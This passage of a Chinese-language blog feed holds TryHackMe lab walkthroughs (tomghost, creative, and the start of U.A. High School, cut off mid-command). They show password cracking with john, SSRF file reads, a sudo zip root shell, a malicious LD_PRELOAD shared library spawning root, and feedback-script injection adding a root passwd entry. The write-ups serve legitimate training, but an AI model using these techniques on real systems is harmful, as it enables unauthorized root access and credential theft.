class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">skyfuck@ubuntu:~$ ls -la</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 3 skyfuck skyfuck 4096 Nov 16 00:44 .</span><br><span class="line">drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..</span><br><span class="line">-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc</span><br><span class="line">drwx------ 2 skyfuck skyfuck 4096 Nov 16 00:44 .cache</span><br><span class="line">-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile</span><br><span class="line">-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ gpg2john tryhackme.asc &gt; hash.txt</span><br><span class="line"></span><br><span class="line">File tryhackme.asc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])</span><br><span class="line">Cost 1 (s2k-count) is 65536 for all loaded hashes</span><br><span class="line">Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes</span><br><span class="line">Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">alexandru        (tryhackme)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-11-16 03:55) 25.00g/s 26800p/s 26800c/s 26800C/s theresa..alexandru</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导入pgp秘钥文件，期间输入上面的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ gpg --import tryhackme.asc</span><br><span class="line">gpg: 钥匙箱‘/home/kali/.gnupg/pubring.kbx’已创建</span><br><span class="line">gpg: /home/kali/.gnupg/trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：公钥 “tryhackme &lt;stuxnet@tryhackme.com&gt;” 已导入</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：私钥已导入</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：“tryhackme &lt;stuxnet@tryhackme.com&gt;” 未改变</span><br><span class="line">gpg: 处理的总数：2</span><br><span class="line">gpg:               已导入：1</span><br><span class="line">gpg:              未改变：1</span><br><span class="line">gpg:       读取的私钥：1</span><br><span class="line">gpg:   导入的私钥：1</span><br></pre></td></tr></table></figure><p>gpg解密<code>credential.pgp</code>文件，期间再次输入上面的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ gpg credential.pgp        </span><br><span class="line">gpg: 警告：没有提供命令。正在尝试猜测您的意图...</span><br><span class="line">gpg: 注意：接收者的偏好设置中找不到密文算法 CAST5</span><br><span class="line">gpg: 由 1024 位的 ELG 密钥加密，标识为 61E104A66184FBCC，生成于 2020-03-11</span><br><span class="line">      “tryhackme &lt;stuxnet@tryhackme.com&gt;”</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat credential      </span><br><span class="line">merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ ssh merlin@10.10.211.222            </span><br><span class="line">merlin@10.10.211.222&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">merlin@ubuntu:~$ id</span><br><span class="line">uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)</span><br><span class="line">merlin@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries for merlin on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User merlin may run the following commands on ubuntu:</span><br><span class="line">    (root : root) NOPASSWD: /usr/bin/zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>gobins 提权</p><p><a href="/../assets/img/Pasted%20image%2020241116170030.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116170030.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">merlin@ubuntu:~$ TF=$(mktemp -u)</span><br><span class="line">merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT &#x27;sh #&#x27;</span><br><span class="line">  adding: etc/hosts (deflated 31%)</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p> 痕迹清理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm $TF </span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>creative-thm</title>
      <link href="/2024/11/16/creative/"/>
      <url>/2024/11/16/creative/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>本机</th><th>目标机器</th></tr></thead><tbody><tr><td>10.17.5.121</td><td>10.10.28.27</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.28.27:22</span><br><span class="line">Open 10.10.28.27:80</span><br></pre></td></tr></table></figure><p>写入host<br><a href="http://creative.thm/">http://creative.thm/</a></p><h3 id="子域枚举"><a href="#子域枚举" class="headerlink" title="子域枚举"></a>子域枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ffuf -u http://creative.thm -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H &quot;Host: FUZZ.creative.thm&quot; -fs 178 </span><br><span class="line"></span><br><span class="line">beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 316ms]</span><br><span class="line">:: Progress: [5000/5000] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:43] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF?</p><p><a href="/../assets/img/Pasted%20image%2020241116151342.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116151342.png"></a></p><h3 id="思考利用"><a href="#思考利用" class="headerlink" title="思考利用"></a>思考利用</h3><ol><li><code>file</code>协议读取文件</li><li>对内部服务进行枚举</li></ol><h3 id="测试利用"><a href="#测试利用" class="headerlink" title="测试利用"></a>测试利用</h3><ol><li><p>不行<br><a href="/../assets/img/Pasted%20image%2020241116152326.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152326.png"></a></p></li><li><p>枚举内部端口<br><a href="/../assets/img/Pasted%20image%2020241116152438.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152438.png"></a></p></li></ol><p><a href="/../assets/img/Pasted%20image%2020241116152529.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152529.png"></a></p><p>文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saad:x:1000:1000:saad:/home/saad:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="/../assets/img/Pasted%20image%2020241116152724.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152724.png"></a></p><p>读取私钥文件</p><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ chmod 600 id_rsa                    </span><br><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ ssh -i id_rsa saad@beta.creative.thm</span><br><span class="line">Enter passphrase for key &#x27;id_rsa&#x27;: </span><br></pre></td></tr></table></figure><p>该死 还需要输入密码才能使用私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt;id_rsa.txt</span><br></pre></td></tr></table></figure><p>密码枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 16 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sweetness        (id_rsa)     </span><br><span class="line">1g 0:00:00:21 DONE (2024-11-16 02:32) 0.04683g/s 44.96p/s 44.96c/s 44.96C/s xbox360..sandy</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                        </span><br></pre></td></tr></table></figure><p>用该密钥进私钥登录</p><p>bash历史</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;saad:MyStrongestPasswordYet$4291&quot; &gt; creds.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">saad@m4lware:~$ sudo -l</span><br><span class="line">[sudo] password for saad: </span><br><span class="line">Matching Defaults entries for saad on m4lware:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User saad may run the following commands on m4lware:</span><br><span class="line">    (root) /usr/bin/ping</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env_keep+=LD_PRELOAD</span><br></pre></td></tr></table></figure><p>这允许我们为运行的命令设置环境变量，就像 .<code>LD_PRELOAD``root``sudo</code></p><p>环境变量用于指定要在进程的任何其他库之前加载的库。<code>LD_PRELOAD</code></p><p>我们可以使用它来使我们运行的进程加载恶意库并运行我们的代码。<code>root``sudo</code></p><p>首先，制作一个恶意的共享库，它将为我们生成一个 shell。</p><p>我们将代码放在函数中，以便在加载库时运行它。<code>_init()</code></p><p>此外，在加载库后取消设置变量以阻止我们运行的其他进程再次加载库并生成另一个 shell。<code>LD_PRELOAD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void _init() &#123;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译到共享库中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">saad@m4lware:/tmp$ vim shell.c</span><br><span class="line">saad@m4lware:/tmp$ <span class="built_in">cat</span> shell.c </span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">_init</span></span>() &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">saad@m4lware:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line">saad@m4lware:/tmp$ <span class="built_in">sudo</span> LD_PRELOAD=/tmp/shell.so /usr/bin/ping</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><p>SSRF 到内部服务 内部的服务到ssh私钥 私钥的密码爆破 通过bash_history 获取到密码<br>通过<code>LD_PRELOAD</code> 进行生成so文件获取到<code>rootshell</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
            <tag> ssh </tag>
            
            <tag> LD_PRELOAD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>U.A. High School·</title>
      <link href="/2024/11/16/U.A.-High-School/"/>
      <url>/2024/11/16/U.A.-High-School/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机IP:10.17.5.121</span><br><span class="line">目标ip:10.10.167.217</span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><a href="/assets/img/Pasted%20image%2020241116134031.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116134031.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241116140002.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116140002.png"></a><br>403 bypass?</p><p><a href="/assets/img/Pasted%20image%2020241116135721.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116135721.png"></a><br><a href="/assets/img/Pasted%20image%2020241116135051.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116135051.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241116135337.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116135337.png"></a></p><h2 id="分析流量包"><a href="#分析流量包" class="headerlink" title="分析流量包"></a>分析流量包</h2><p><a href="/assets/img/Pasted%20image%2020241116140328.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116140328.png"></a></p><p>确实存在一个文件<br>    <a href="/assets/img/Pasted%20image%2020241116140515.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116140515.png"></a></p><p>进行模糊测试<br><a href="/assets/img/Pasted%20image%2020241116140749.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116140749.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241116141240.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116141240.png"></a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>立足点 getwebshell</p><p><a href="/assets/img/Pasted%20image%2020241116141440.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116141440.png"></a></p><p>反弹shell</p><p><a href="/assets/img/Pasted%20image%2020241116141917.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116141917.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241116141930.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116141930.png"></a></p><p>转化为tty</p><p><a href="/assets/img/Pasted%20image%2020241116142301.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116142301.png"></a><br><a href="/assets/img/Pasted%20image%2020241116142800.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116142800.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241116143154.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241116143154.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/U-A-High-School </span><br><span class="line">❯ hexeditor -b oneforall.jpg                                                                                                    </span><br><span class="line">kali@kali ~/Documents/thm/U-A-High-School </span><br><span class="line">❯ thunar                                                                                                                        </span><br><span class="line">kali@kali ~/Documents/thm/U-A-High-School </span><br><span class="line">❯ steghide extract -sf oneforall.jpg                                                                                            </span><br><span class="line">Enter passphrase:                                                                                                               </span><br><span class="line">the file &quot;creds.txt&quot; does already exist. overwrite ? (y/n) n</span><br><span class="line">steghide: did not write to file &quot;creds.txt&quot;.</span><br><span class="line">kali@kali ~/Documents/thm/U-A-High-School [1]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ cat creds.txt                                                                                                                 </span><br><span class="line">Hi Deku, this is the only way I&#x27;ve found to give you your account credentials, as soon as you have them, delete this file:      </span><br><span class="line"></span><br><span class="line">deku:One?For?All_!!one1/A</span><br></pre></td></tr></table></figure><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh deku@10.10.167.217                                                                                                        </span><br><span class="line">The authenticity of host &#x27;10.10.167.217 (10.10.167.217)&#x27; can&#x27;t be established.                                                  </span><br><span class="line">ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.167.217&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">deku@10.10.167.217&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sat 16 Nov 2024 06:35:11 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:             119</span><br><span class="line">  Usage of /:   47.0% of 9.75GB   Users logged in:       0</span><br><span class="line">  Memory usage: 48%               IPv4 address for eth0: 10.10.167.217</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Introducing Expanded Security Maintenance for Applications.</span><br><span class="line">   Receive updates to over 25,000 software packages with your</span><br><span class="line">   Ubuntu Pro subscription. Free for personal use.</span><br><span class="line"></span><br><span class="line">     https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="line"></span><br><span class="line">37 updates can be applied immediately.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3</span><br><span class="line">deku@myheroacademia:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;W3lC0m3_D3kU_1A_0n3f0rAll??&#125;</span><br><span class="line">deku@myheroacademia:~$ sudo -l</span><br><span class="line">[sudo] password for deku: </span><br><span class="line">Matching Defaults entries for deku on myheroacademia:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User deku may run the following commands on myheroacademia:</span><br><span class="line">    (ALL) /opt/NewComponent/feedback.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以写入任意命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh</span><br><span class="line">Hello, Welcome to the Report Form       </span><br><span class="line">This is a way to report various problems</span><br><span class="line">    Developed by                        </span><br><span class="line">        The Technical Department of U.A.</span><br><span class="line">Enter your feedback:</span><br><span class="line">test&gt;/tmp/tet.txt</span><br><span class="line">It is This:</span><br><span class="line">Feedback successfully saved.</span><br><span class="line">deku@myheroacademia:~$ cat /tmp/tet.txt </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>手动制作一个密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd -m md5crypt -s</span><br><span class="line">密码：admin</span><br><span class="line">$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">deku@myheroacademia:~$ sudo /opt//NewComponent/feedback.sh</span><br><span 